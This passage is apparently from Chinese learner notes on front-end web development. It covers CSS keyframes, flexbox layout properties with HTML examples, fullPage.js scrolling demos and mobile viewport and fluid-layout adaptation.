        Keyframes具有其自己的语法规则，他的命名是由"@keyframes"开头，后面紧接着是这个“动画的名称”加上一对花括号“{}”，括号中就是一些不同时间段样式规则，有点像我们css的样式写法一样。对于一个"@keyframes"中的样式规则是由多个百分比构成的，如“0%”到"100%"之间，我们可以在这个规则中创建多个百分比，我们分别给每一个百分比中给需要有动画效果的元素加上不同的属性，从而让元素达到一种在不断变化的效果，比如说移动，改变元素颜色，位置，大小，形状等，不过有一点需要注意的是，我们可以使用“fromt”“to”来代表一个动画是从哪开始，到哪结束，也就是说这个 "from"就相当于"0%"而"to"相当于"100%",值得一说的是，其中"0%"不能像别的属性取值一样把百分比符号省略，我们在这里必须加上百分符号（“%”）如果没有加上的话，我们这个keyframes是无效的，不起任何作用。因为keyframes的单位只接受百分比值。[2]
    </p>
</div>
```
>[success] # 弹性盒子布局
*  先设置父元素 display: flex; 变成弹性盒子

![](https://box.kancloud.cn/2c56787031b2f5b1b2bc08ae19089c52_1020x209.png)
```
1.上面的布局传统方式需要把子元素浮动布局
2.在css3中使用  display: flex; ---  自动让子元素形成上面的布局  ，但父盒子宽度小于实际所有盒子总长的宽度，内部子元素会进行缩放,当子元素的宽度和大于父容器宽度的时候，子元素会自动平均收缩
3.justify-content --- 属性调整内部盒子排列方式
    flex-start:让子元素从父容器的起始位置开始排列
    flex-end:让子元素从父容器的结束位置开始排列
    center:让子元素从父容器的中间位置开始排列
    space-between:左右对齐父容器的开始和结束，中间平均分页，产生相同的间距
    space-around:将多余的空间平均的分页在每一个子元素的两边 margin:0 auto.造成中间盒子的间距是左右两边盒子间距的两倍
```
>[danger] ##### 案例
* flex-start
![](https://box.kancloud.cn/507516db37d173a2d9fc5a1d1938e12c_1058x221.png)
* flex-end
![](https://box.kancloud.cn/52639485ababf85b37d6fc72788dacca_1008x198.png)
* center
![](https://box.kancloud.cn/fd64b3515a126fef76d13676ac1cf3b5_1003x209.png)
* space-between
![](https://box.kancloud.cn/2cdfb4b485a2d67aa9d5417e62eee153_1006x209.png)
* space-around
![](https://box.kancloud.cn/dd041da97594eb812b7d7425688f4f00_1050x219.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        .box{
            width: 1000px;
            height: 200px;
            border: 1px solid red;
            box-sizing: border-box;
            /*设置父容器为伸缩盒子：会使每一个子元素自动变成伸缩项*/
            display: flex;
            /*设置子元素的排列方式
            flex-start:让子元素从父容器的起始位置开始排列
            flex-end:让子元素从父容器的结束位置开始排列
            center:让子元素从父容器的中间位置开始排列
            space-between:左右对齐父容器的开始和结束，中间平均分页，产生相同的间距
            space-around:将多余的空间平均的分页在每一个子元素的两边 margin:0 auto.造成中间盒子的间距是左右两边盒子间距的两倍*/
            justify-content: space-around;
        }
        .first{
            width: 200px;
            height: 100%;
            background-color: red;
        }
        .second{
            width: 200px;
            height: 100%;
            background-color: green;
        }
        .third{
            width: 200px;
            height: 100%;
            background-color: blue;
        }
        .fourth{
            width: 200px;
            height: 100%;
            background-color: pink;
        }
    </style>
</head>
<body>
<div class="box">
    <div class="first">1</div>
    <div class="second">2</div>
    <div class="third">3</div>
    <div class="fourth">4</div>
</div>
</body>
</html>
```

>[success] # 弹性盒子自动换行
```
1.上面子元素 会进行自动缩放导致，如果想要盒子对应换行使用flex-flow:是flex-wrap和flex-direction的综合 控制盒子换行和排列
2.flex-wrap:控制子元素是否换行显示，默认不换行
	nowrap:不换行--则收缩
    wrap:换行
    wrap-reverse:翻转，原来是从上到下，翻转后就是从下到上来排列
3.flex-direction：设置子元素的排列方向：就是用来主轴方向，默认主轴方向是row(水平方向)
    row:水平排列方向，从左到右
    row-reverse:水平排列方向，从右到左
    column:垂直排列方向，从上到下
    column-reverse：垂直排列方向，从下到上
4.上面两个在一起的缩写flex-flow: row wrap;
```
>[danger] ##### 代码
* 因为    space-around:将多余的空间平均的分页在每一个子元素的两边 margin:0 auto.造成中间盒子的间距是左右两边盒子间距的两倍，所以换行的元素居中显示

![](https://box.kancloud.cn/c86b8eda28b06f4d400f9849a67b9eb8_909x575.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        .box{
            width: 900px;
            height: 600px;
            border: 1px solid red;
            box-sizing: border-box;
            margin:0 auto;
            /*设置父容器为盒子：会使每一个子元素自动变成伸缩项
             当子元素的宽度和大于父容器宽度的时候，子元素会自动平均收缩*/
            display: flex;
            /*设置子元素的主轴方向上的排列方式*/
            justify-content: space-around;

            /*flex-flow:是flex-wrap和flex-direction的综合
            flex-wrap:控制子元素是否换行显示，默认不换行
                nowrap:不换行--则收缩
                wrap:换行
                wrap-reverse:翻转，原来是从上到下，翻转后就是从下到上来排列*/
            /*flex-wrap: wrap;*/
            /*flex-direction：设置子元素的排列方向：就是用来主轴方向，默认主轴方向是row(水平方向)
                row:水平排列方向，从左到右
                row-reverse:水平排列方向，从右到左
                column:垂直排列方向，从上到下
                column-reverse：垂直排列方向，从下到上*/
            /*flex-direction: column-reverse;*/

            flex-flow: row wrap;
        }
        .first{
            width: 200px;
            height: 200px;
            background-color: red;
        }
        .second{
            width: 200px;
            height: 200px;
            background-color: green;
        }
        .third{
            width: 200px;
            height: 200px;
            background-color: blue;
        }
        .fourth{
            width: 200px;
            height: 200px;
            background-color: pink;
        }
        .fifth{
            width: 200px;
            height: 200px;
            background-color: purple;
        }
    </style>
</head>
<body>
<div class="box">
    <div class="first">1</div>
    <div class="second">2</div>
    <div class="third">3</div>
    <div class="fourth">4</div>
    <div class="fifth">5</div>
</div>
</body>
</html>
```
>[success] # flex-grow子项填充空白比例
```
1.flow-grow : 可以来扩展子元素的宽度：设置当前元素应该占据剩余空间的比例值
比例值计算 ：当前空间的flex-grow/所有兄弟元素的flex-grow的和
flex-grow的默认是0:说明子元素并不会去占据剩余的空间
```
* 外层div900px 每一个子项div200px，3个600px,空白地方的总和为300
![](https://box.kancloud.cn/61f8acc46b7bf0460eb1e77b8da41b6d_904x261.png)
* 把红色设置成1，怎红色在原有基础上加上所有的空白项
![](https://box.kancloud.cn/81c417b7629211b039ba88610fe2c230_916x222.png)

>[danger] ##### 案例
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        .box{
            width: 900px;
            height: 600px;
            border: 1px solid red;
            margin:0 auto;
            /*设置父容器为盒子：会使每一个子元素自动变成伸缩项
             当子元素的宽度和大于父容器宽度的时候，子元素会自动平均收缩*/
            display: flex;
            /*设置子元素的主轴方向上的排列方式*/
            justify-content: space-around;

        }
        .first{
            width: 200px;
            height: 200px;
            background-color: red;
            /*flow-grow:可以来扩展子元素的宽度：设置当前元素应该占据剩余空间的比例值
            比例值计算 ：当前空间的flex-grow/所有兄弟元素的flex-grow的和
            flex-grow的默认是0:说明子元素并不会去占据剩余的空间*/
            flex-grow:1;
        }
        .second{
            width: 200px;
            height: 200px;
            background-color: green;
            flex-grow: 0;
        }
        .third{
            width: 200px;
            height: 200px;
            background-color: blue;
            flex-grow: 0;
        }
    </style>
</head>
<body>
<div class="box">
    <div class="first">1</div>
    <div class="second">2</div>
    <div class="third">3</div>
</div>
</body>
</html>
```
>[danger] ##### 根据侧轴居中
![](https://box.kancloud.cn/7102bfce49f84c91738a648169972fea_903x613.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        .box{
            width: 900px;
            height: 600px;
            border: 1px solid red;
            margin:0 auto;
            /*设置父容器为盒子：会使每一个子元素自动变成伸缩项
             当子元素的宽度和大于父容器宽度的时候，子元素会自动平均收缩*/
            display: flex;
            /*设置子元素的主轴方向上的排列方式*/
            justify-content: space-around;
            /*align-items:设置子元素(伸缩项)在侧轴方向上的对齐方式
            center:设置在侧轴方向上居中对齐
            flex-start:设置在侧轴方向上顶对齐
            flex:end:设置在侧轴方向上底对齐
            stretch:拉伸：让子元素在侧轴方向上进行拉伸，填充满整个侧轴方向>> 默认值
            baseline:文本基线*/
            align-items: center;
        }
        .first {
            width: 200px;
            height: 200px;
            background-color: red;
            align-self: flex-start;
        }
        .second{
            width: 200px;
            height: 200px;
            background-color: green;
            /*设置单个元素在侧轴方向上的对齐方式*/
            align-self: flex-end;
        }
        .third{
            width: 200px;
            height: 200px;
            background-color: blue;
        }
    </style>
</head>
<body>
<div class="box">
    <div class="first">bb</div>
    <div class="second" style="font-size: 100px">gg</div>
    <div class="third">klkaslg</div>
</div>
</body>
</html>
```
>[success] # flex-shrink 定义子元素伸缩比例
```
1.如果不设置，子元素平均占据父元素
2.如果设置0，就不按比例缩放，会按照原始的大小
3.flex-shrink:定义收缩比例，通过设置的值来计算收缩空间
 比例值计算 ：当前空间的flex-shrink/所有兄弟元素的flex-shrink的和
 默认值为1
```
>[danger] ##### 案例
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        .box{
            width: 500px;
            height: 600px;
            border: 1px solid red;
            margin:0 auto;
            /*设置父容器为盒子：会使每一个子元素自动变成伸缩项
             当子元素的宽度和大于父容器宽度的时候，子元素会自动平均收缩*/
            display: flex;
            /*设置子元素的主轴方向上的排列方式*/
            justify-content: space-around;

        }
        .first {
            width: 200px;
            height: 200px;
            background-color: red;
            /*flex-shrink:定义收缩比例，通过设置的值来计算收缩空间
             比例值计算 ：当前空间的flex-shrink/所有兄弟元素的flex-shrink的和
            默认值为1*/
            flex-shrink: 2;
        }
        .second{
            width: 200px;
            height: 200px;
            background-color: green;
            flex-shrink: 1;
        }
        .third{
            width: 200px;
            height: 200px;
            background-color: blue;
            flex-shrink: 1;
        }
    </style>
</head>
<body>
<div class="box">
    <div class="first">1</div>
    <div class="second">2</div>
    <div class="third">3</div>
</div>
</body>
</html>
```
>[success] # 子元素比例布局
![](https://box.kancloud.cn/8261353862938cec809d380c536d5dba_1373x503.png)
```
1.flex是用来设置当前伸缩子项占据剩余空间的比例值
2.占据的是父元素的比例
```
>[danger] ##### 代码
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        .box{
            width: 100%;
            height: 500px;
            background-color: #ccc;
            margin:0 auto;
            /*设置父容器的为伸缩盒子*/
            display: flex;
            /*设置子元素在主轴方向上的排列方式*/
            /*justify-content: flex-start;*/
        }
        .left{
            /*flex是用来设置当前伸缩子项占据剩余空间的比例值*/
            flex: 1;
            height: 500px;
            background-color: red;
        }
        .right{
            flex: 4;
            height: 500px;
            background-color: blue;
        }
    </style>
</head>
<body>
<div class="box">
    <div class="left"></div>
    <div class="right"></div>
</div>
</body>
</html>
```
>[danger] ##### 菜单伸缩案例
```
1.设置li的flex占据父类元素比例
```
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        div{
            width: 500px;
            height: 400px;
            border: 1px solid #ccc;
            margin:100px auto;
        }
        div > ul{
            list-style: none;
            width: 100%;
            /*将父容器设置了伸缩盒子，子元素默认成为伸缩项  float margin*/
            display: flex;
        }
        div > ul > li{
            /*宽度
            1.我们并不知道li的具体的数量
            2.也不直接设置%*/
            height: 36px;
            line-height: 36px;
            text-align: center;
            background-color: #9fff9d;
            border-right: 1px solid #ccc;
            flex: 1;
        }
    </style>
</head>
<body>
<div>
    <ul>
        <li>首页</li>
        <li>商品分类</li>
        <li>我的订单</li>
        <li>最新商品</li>
        <li>联系我们</li>
    </ul>
</div>
</body>
</html>
```
>[success] # 案例
![](https://box.kancloud.cn/63cee826a4add0736fe0d720f76ad3c4_548x615.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        .layout{
            width: 500px;
            height: 600px;
            background-color: #CCCCCC;
            margin:10px auto;
            /*设置父容器为伸缩盒子*/
            display: flex;
            /*默认的主轴是row,这里需要以列的方式进行排列*/
            flex-direction: column;
        }
        header{
            width: 100%;
            height: 60px;
            background-color: red;
        }
        main{
            width: 100%;
            background-color: green;
            /*让当前伸缩项占据父容器的剩余空间*/
            flex: 1;
            /*让main成为伸缩盒子*/
            display: flex;
        }
        main > article{
            height: 100%;
            flex: 1;
            background-color: pink;
        }
        main > aside{
            height: 100%;
            flex: 3;
            background-color: darkblue;
        }
        footer{
            width: 100%;
            height: 80px;
            background-color: purple;
        }
    </style>
</head>
<body>
<div class="layout">
    <header></header>
    <main>
        <article></article>
        <aside></aside>
    </main>
    <footer></footer>
</div>
</body>
</html>
```
>[success] # 携程网案例
![](https://box.kancloud.cn/429e88bf76544391d40edc6223214c35_571x641.png)
```
1.一个大div 套着三个div
2.其中中间的div 是五个块在cs3中用section 表示div,中间看似分割实际用border属性边框
3.利用弹性盒子，布局
```
>[danger] ##### 代码
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        *{
            padding: 0;
            margin: 0;
        }
        /*顶部块样式*/
        header{
            width: 100%;
            /*设置为伸缩盒子*/
            display: flex;
        }
        header > a{
            /*width: 100%;*/
            /*flex:设置当前子元素占据父容器剩余宽度的比例*/
            flex: 1;
        }
        header > a > img{
            width: 100%;
        }
        /*主体内容块样式*/
        main{
            width: 100%;
            padding:0 10px;
            /*设置盒模型*/
            box-sizing: border-box;
        }
        main > .item{
            width: 100%;
            height: 100px;
            background-color: #57c3ae;
            border-radius: 10px;
            margin-top:10px;
            /*设置为伸缩盒子*/
            display: flex;
        }
        main > .item:nth-of-type(2){
            background-color: #33aa46;
        }
        main > .item:nth-of-type(3){
            background-color: #aa4b40;
        }
        main > .item:nth-of-type(4){
            background-color: #445faa;
        }
        main > .item > .left{
            flex: 1;
        }
        main > .item > .right{
            flex: 2;
            /*设置换行显示*/
            flex-wrap: wrap;
            /*设置为伸缩盒子*/
            display: flex;
        }
        main > .item > .right > a{
            /*如果想让子元素换行显示，必须为子元素设置宽度*/
            width: 50%;
            box-sizing: border-box;
            border-left: 1px solid #fff;
            border-bottom: 1px solid #fff;
            display: block;
            color: #fff;
            line-height: 50px;
            text-align: center;
            text-decoration: none;
        }
        main > .item > .right > a:nth-last-of-type(-n+2){
            border-bottom:none
        }
        main > .extra{
            width: 100%;
            display: flex;
        }
        main > .extra > a{
            flex: 1;
        }
        main > .extra > a > img{
            width: 100%;
        }
        /*底部块样式*/
        footer{
            width: 100%;
            font-size: 13px;
        }
        footer > nav{
            width: 100%;
            display: flex;
            border-top:1px solid #ccc;
            border-bottom:1px solid #ccc;
        }
        footer > nav > a{
            flex: 1;
            line-height: 30px;
            text-align: center;
            color: #888;
            text-decoration: none;
        }
        footer > .link{
            text-align: center;
            line-height: 25px;
        }
        footer > .copyRight{
            text-align: center;
        }
    </style>
</head>
<body>
<div class="container">
    <header>
        <a href="">
            <img src="../images/banner.jpg" alt="">
        </a>
    </header>
    <main>
        <section class="item">
            <div class="left"></div>
            <div class="right">
                <a href="">海外酒店</a>
                <a href="">团购</a>
                <a href="">特惠酒店</a>
                <a href="">客栈公寓</a>
            </div>
        </section>
        <section class="item">
            <div class="left"></div>
            <div class="right">
                <a href="">海外酒店</a>
                <a href="">团购</a>
                <a href="">特惠酒店</a>
                <a href="">客栈公寓</a>
            </div>
        </section>
        <section class="item">
            <div class="left"></div>
            <div class="right">
                <a href="">海外酒店</a>
                <a href="">团购</a>
                <a href="">特惠酒店</a>
                <a href="">客栈公寓</a>
            </div>
        </section>
        <section class="item">
            <div class="left"></div>
            <div class="right">
                <a href="">海外酒店</a>
                <a href="">团购</a>
                <a href="">特惠酒店</a>
                <a href="">客栈公寓</a>
            </div>
        </section>
        <section class="extra">
            <a href="">
                <img src="../images/extra_1.png" alt="">
            </a>
            <a href="">
                <img src="../images/extra_2.png" alt="">
            </a>
        </section>
    </main>
    <footer>
        <nav>
            <a href="">电话预订</a>
            <a href="">下载客户端</a>
            <a href="">我的订单</a>
        </nav>
        <p class="link">
            <a href="">网站地图</a>
            <a href="">ENGLISH</a>
            <a href="">电脑版</a>
        </p>
        <p class="copyRight">&copy;2015 携程旅行</p>
    </footer>
</div>
</body>
</html>
```
>[success] # 全屏滚动效果动化
<a href="http://www.dowebok.com/">不错的网址</a>
```
1.在不错网址找到fullPage.js 插件
```
>[danger] ##### 最简单的使用
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        .first.current h3{
            font-size: 100px;
        }
        /*交集选择器：h3当当前元素同时添加了second和current的时候才会有效果*/
        .second.current h3{
            font-size: 100px;
        }
    </style>
</head>
<body>
<div id="dowebok">
    <!--每一个section就是一屏-->
    <div class="section first">
        <h3>第一屏</h3>
    </div>
    <div class="section second">
        <h3>第二屏</h3>
    </div>
    <div class="section">
        <h3>第三屏</h3>
    </div>
    <div class="section">
        <h3>第四屏</h3>
    </div>
    <div class="section">
        <h3>第5屏</h3>
    </div>
</div>
<script src="../js/jquery.min.js"></script>
<script src="../js/jquery.fullPage.min.js"></script>
<script>
    $(function(){
        $('#dowebok').fullpage({
            /*设置每一屏的背景色*/
            sectionsColor:["red","green","blue","pink","skyBlue"],
            /*当滚动到某一屏之后调用
            * index:当前屏的索引，索引从1开始*/
            afterLoad:function(anchorLink,index){
                /*将其它屏的current标记移除*/
                $(".section").removeClass("current");
//                alert(index);
                /*添加样式,当滚动到某一屏之后，为元素添加样式--标记*/
                $(".section").eq(index-1).addClass("current");
            }
        });
    });
</script>

</body>
</html>
```
>[success] # 360 网页效果
![](https://box.kancloud.cn/ff5b77515576f0e7ea3025c97bb95140_516x319.png)
```
1. 利用父元素百分比定位，可以让内容随着缩放 不改变效果
```
```
*{
    padding: 0;
    margin: 0;
}
#360Page{

}
.section{
    overflow: hidden;
}

/*第一屏样式*/
.first{
    padding-top:80px;
}
/*插件会默认为所有内容添加一个父容器，意味着logo并不是first的直接子元素*/
.first .logo{
    background: url("../images/logo.png");
    height: 186px;
    width: 251px;
    margin:0 auto;
}
.first  .text{
    width: 100%;
    text-align: center;
    margin-top:80px;
}
.first  .text > img{
    margin:0 40px;
    opacity: 0.2;
    /*添加过渡效果*/
    transition: margin 1s,opacity 1s;
}
.first .intro{
    background: url("../images/info_1.png");
    height: 49px;
    width: 772px;
    margin:40px auto;
}
.first.current .text > img{
    margin:0 5px;
    opacity: 1;
}

/*第二屏样式*/
.second{

}
/* 插件还嵌套了层div*/
.second > div {
    display: flex;
    /*设置主轴方向上的排列方式*/
    justify-content: space-around;
    /*设置侧轴方向上的排列方式*/
    align-items: center;
}
.second .shield{
    width: 440px;
    font-size: 0;
}
.second .info{
    height: 309px;
    width: 635px;
    background: url("../images/info_2.png");
}
.second .shield > img{
    /*添加过渡效果*/
    transition: transform 1s;
}
.second .shield > img:nth-of-type(1){
    transform: translate(100px,100px) rotate(30deg);
}
.second .shield > img:nth-of-type(2){
    transform: translate(-100px,-100px) rotate(-30deg);
}
.second .shield > img:nth-of-type(3){
    transform: translate(200px,200px) rotate(60deg);
}
.second .shield > img:nth-of-type(4){
    transform: translate(-200px,-200px) rotate(-60deg);
}
.second .shield > img:nth-of-type(5){
    transform: translate(150px,150px) rotate(90deg);
}
.second .shield > img:nth-of-type(6){
    transform: translate(50px,150px) rotate(-90deg);
}
.second .shield > img:nth-of-type(7){
    transform: translate(-150px,-150px) rotate(60deg);
}
.second .shield > img:nth-of-type(8){
    transform: translate(10px,-250px) rotate(-90deg);
}
.second .shield > img:nth-of-type(9){
    transform: translate(-250px,10px) rotate(45deg);
}
/*添加第二屏过渡效果*/
.second.current .shield > img{
    /*清除默认添加的transform*/
    transform: none;
}

/*第三屏样式*/
.third{
    position: relative;
}
.third .info{
    height: 278px;
    width: 631px;
    background: url("../images/info_3.png");
    position: absolute;
    /*定位的参照是参照父容器的宽高*/
    left: 50%;
    top: 50%;
    /*transform的translate是相对于元素本身的宽高*/
    transform:translate(-100%,-50%);
}
.third .circle{
    height: 449px;
    width: 453px;
    background: url("../images/circle.png");
    position: absolute;
    right: 50%;
    top: 50%;
    transform:translate(120%,-50%);
}
.third .circle > .rocket{
    height: 204px;
    width: 203px;
    background: url("../images/rocket.png");
    position: absolute;
    left: -600px;
    top: 650px;
    /*添加过渡*/
    transition: left 1s,top 1s;
}
/*添加第三屏动画*/
.third.current .circle > .rocket{
    left: 125px;
    top: 125px;
}

/*第四屏样式*/
.fourth{
    position: relative;
}
.fourth .search{
    width: 529px;
    height: 438px;
    position: absolute;
    left: 50%;
    top: 50%;
    transform: translate(-115%,-50%);
    overflow: hidden;
}
.fourth .search > .searchBar{
    width: 529px;
    height: 66px;
    background: url("../images/search.png");
    /*开始时，搜索框不可见，所以可以进行默认的偏移*/
    transform: translateX(-100%);
}
.fourth .search > .searchText{
    /*开始时，文本不可见*/
    width: 0px;
    height: 22px;
    background: url("../images/key.png");
    position: absolute;
    left: 15px;
    top: 20px;
}
.fourth .search > .searchResult{
    width: 529px;
    /*搜索结果默认不可见*/
    height: 0px;
    background: url("../images/result.png");
    margin-top:-12px;
}
.fourth .info{
    width: 612px;
    height: 299px;
    background: url("../images/info_4.png");
    position: absolute;
    right: 50%;
    top: 50%;
    transform:translate(100%,-50%);
}
/*第四屏过渡效果的实现*/
.fourth.current .search > .searchBar{
    transform: translateX(0%);
    /*添加过渡样式*/
    transition: transform 1s;
}
.fourth.current .search > .searchText{
    width: 99px;
    transition: width 1s 1s steps(5);
}
.fourth.current .search > .searchResult{
    height: 372px;
    transition: height 1s 2s;
}
```
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <link rel="stylesheet" href="../css/360Page.css">
    <script src="../js/jquery.min.js"></script>
    <script src="../js/jquery.fullPage.min.js"></script>
</head>
<body>
<div id="360Page">
    <div class="section first">
        <div class="logo"></div>
        <div class="text">
            <img src="../images/text_1.png" alt="">
            <img src="../images/text_2.png" alt="">
            <img src="../images/text_3.png" alt="">
            <img src="../images/text_4.png" alt="">
            <img src="../images/text_5.png" alt="">
            <img src="../images/text_6.png" alt="">
            <img src="../images/text_7.png" alt="">
            <img src="../images/text_8.png" alt="">
        </div>
        <div class="intro"></div>
    </div>
    <div class="section second">
        <div class="shield">
            <img src="../images/shield_1.png" alt="">
            <img src="../images/shield_2.png" alt="">
            <img src="../images/shield_3.png" alt="">
            <img src="../images/shield_4.png" alt="">
            <img src="../images/shield_5.png" alt="">
            <img src="../images/shield_6.png" alt="">
            <img src="../images/shield_7.png" alt="">
            <img src="../images/shield_8.png" alt="">
            <img src="../images/shield_9.png" alt="">
        </div>
        <div class="info"></div>
    </div>
    <div class="section third">
        <div class="info"></div>
        <div class="circle">
            <div class="rocket"></div>
        </div>
    </div>
    <div class="section fourth">
        <div class="search">
            <div class="searchBar"></div>
            <div class="searchText"></div>
            <div class="searchResult"></div>
        </div>
        <div class="info"></div>
    </div>
    <div class="section fifth">
        <h3>第5屏</h3>
    </div>
</div>
<script>
    $(function(){
        $('#360Page').fullpage({
            /*设置每一屏的背景色*/
            sectionsColor:['#0da5d6', '#2AB561', '#DE8910', '#16BA9D', '#0DA5D6'],
            /*滚动到某一屏之后的回调
            * index:当前屏的索引，索引从1开始*/
            afterLoad:function(anchorLink,index){
                /*将其它屏的current样式标记清除*/
                $(".section").removeClass("current");
                setTimeout(function(){
                    /*当滚动到某一个屏之后，添加样式标记,延迟一个效果执行*/
                    $(".section").eq(index-1).addClass("current");},500);
            }
        });
    });
</script>
</body>
</html>
```
>[success] # 浏览器的一些适配
```
1.可以使用jquery,但是不建议
2.jquery  做了很多桌面浏览器的兼容问题 特别是IE，但是移动端没有IE浏览器
3.主流的浏览器：谷歌 火狐（2016年停止了维护和更新） safari浏览器  百度  360 qq ...
4.特点：内核基本上都是  webkit  或者 blink  兼容  -webkit-
5.使用H5的api 或者说使用一个 叫做： zepto.js 的库（基于高版本浏览器开发）
```
>[danger] ##### 考虑兼容问题
```
1.根据上诉所说兼容一般要考虑webkit 内核浏览器
```
>[danger] ##### 移动端的开发总结
```
1.适配问题：移动端设备尺寸不一致
2.流式布局：随着浏览器尺寸的改变做自适应 (掌握)
3.当放到移动端预览：通过谷歌浏览器的模拟器（真机调试：服务器和手机设备在同一个局域网内容即可）
4.视口：在移动端特有的视口会对网页进行缩放
5.视口设置：标准化设置 （掌握）
6.非主流视口设置：淘宝多种比例的缩放（页面的缩放 640 1242）
7.640px 1242px px是css单位  真机的分辨率不是px
8.在移动设备有  物理像素的概念   1px 单位里面可能可以放多个物理像素
9.物理像素比------> 非矢量的网页内容可能会失真
10.标准视口设置里面：2倍图 （掌握）

11. 在移动端尺寸计算都是从边框开始的
12. 移动端特有的属性，在移动端使用css3属性尽可能的加兼容  私有前缀
13. 页面的最大宽度限制的原因：和主流设计稿(640px 750px)
14. 基于流式布局的网页开发（百分比布局）
15. 双飞翼，两栏自适应  （布局方式）

16. 移动端常见的滑动效果：touchstart touchmove touchend (掌握)
17. 衍生：手势事件  swipe 相关事件的原理
18. click在移动端有300ms的延时：1，tap事件 原理  2. fastclick插件使用
19. 区域滚动效果：插件 iscroll
```
[TOC]
>[success] # 流式布局概念
```
1.流式布局：就是百分比布局，非固定像素，内容向
 侧填充，理解成流动的布局，称为流式布局
```
>[danger] ##### 案例
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        body{
            margin: 0;
            padding: 0;
        }
        .box{
            width:100%;
            background: pink;
        }
    </style>
</head>
<body>
<div class="box">
    布局布局布局布局布局布局布局布局布局布局
    布局布局布局布局布局布局布局布局布局布局
    布局布局布局布局布局布局布局布局布局
    布局布局布局布局布局布局布局布局布局布局
    布局布局布局布局布局布局布局布局布局布局布局布局布
    局布局布局布局布局布局布局布局布局布局布局布局布局布局布
    局布局布局布局布局布局布局布局布局布局布局布局布局
</div>
</body>
</html>
```
[TOC]
>[success] # 手机标准适配方案
```
声明：<meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=0">
```
```
1.手机端会有一个视觉窗口viewport，这个是一个虚拟的区域，承载页面，相当
 与将页面内容进行等比例缩放，例如字体会进行缩放，
2.承载关系：浏览器---->viewport---->网页，相当于网页的内容因为viewport 
  进行了等比例缩放
3.下面分析适配
```
* 进行适配调整
```
1.网页的宽度和浏览器一致
2.默认显示的比例和pc端一致，不应该被viewport进行缩放，比例1.0
3.不允许用户手动缩放页面
```
* 根据上面三点进行适配
```
1.声明<meta name="viewport"> 设置视口的标签  在head里面并且应该紧接着编码设置
2.viewport 一些参数介绍：
	2.1. width    可以设置宽度   (device-width 当前设备的宽度)
    2.2. height   可以设置高度
    2.3. initial-scale  可以设置默认的缩放比例
    2.4. user-scalable  可以设置是否允许用户自行缩放
    2.5. maximum-scale  可以设置最大缩放比例
    2.6. minimum-scale  可以设置最小缩放比例
    在<meta name="viewport" content="" >  content="" 使用以上参数
    2.7. width=device-width   宽度一致比例是1.0
    2.8 .initial-scale=1.0    宽度一致比例是1.0
    2.9. user-scalable=no     不允许用户自行缩放  （yes，no  1,0）
    标准适配方案：
    <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=0">
    meta:vp + tab  快捷方式
```
>[danger] ##### 案例
```
1.注意宽度设置成百分百
```
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=0">
    <title>Title</title>
    <style>
        body{
            margin: 0;
            padding: 0;
        }
        .box{
            width:100%;
            background: pink;
        }
    </style>
</head>
<body>
<div class="box">
    布局布局布局布局布局布局布局布局布局布局
    布局布局布局布局布局布局布局布局布局布局
    布局布局布局布局布局布局布局布局布局
    布局布局布局布局布局布局布局布局布局布局
    布局布局布局布局布局布局布局布局布局布局布局布局布
    局布局布局布局布局布局布局布局布局布局布局布局布局布局布
    局布局布局布局布局布局布局布局布局布局布局布局布局
</div>
</body>
</html>
```
>[success] # 非主流适配（了解即可）
```
 非主流的适配方案：
    1.页面的真实尺寸会比在设备的上尺寸要大几倍
    2.假设设备是iphone4 -> 320px -> 网页尺寸 640px
    3.缩放操作，有2倍的  有3倍  和屏幕像素比有关系
    4.什么是屏幕像素（物理像素，像素点） px(页面的尺寸单位)
    5.物理像素 是设备显示屏的最小可视颗粒的大小   以前的手机（直板手机）
    6.现在有 高清显示屏  视网膜屏  retina屏
    7.显示的效果就提高了更细腻，但是在显示同等质量的图片的时候（模糊效果）

    8.在屏幕像素比（一个px宽的屏幕能放几个物理像素）高的设备  图片（非矢量）显示会模糊
    9.提高网页的清晰度  根据屏幕的像素比 来缩放网页
    10.但是这样的适配方案成本非常高
    11.一般的企业开发当中使用的还是标准化设置

    在高清显示屏当中：图片可能会失真（模糊）
```
[TOC]
>[success] # 通用样式的处理
```
1. box-sizing: border-box;  --- 设置防止内容溢出  不出现滚动条  提供用户体验
2.-webkit-tap-highlight-color: red; 轻触高亮设置
```
>[danger] ##### box-sizing 讲解
* 如果不设置 出现的效果
![](https://box.kancloud.cn/06fad75ff7f61269631cd8fe335b283b_412x662.png)
```
1.box-sizing: border-box;  盒子宽度自动包含内边距，不用考虑内边距撑大盒子的问题
2.因为手机端宽度不确定，所以流式布局宽度设置成百分百，当在设置内边距时，会将盒子撑大，导致出现滚动条
```
* 解决方法代码
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
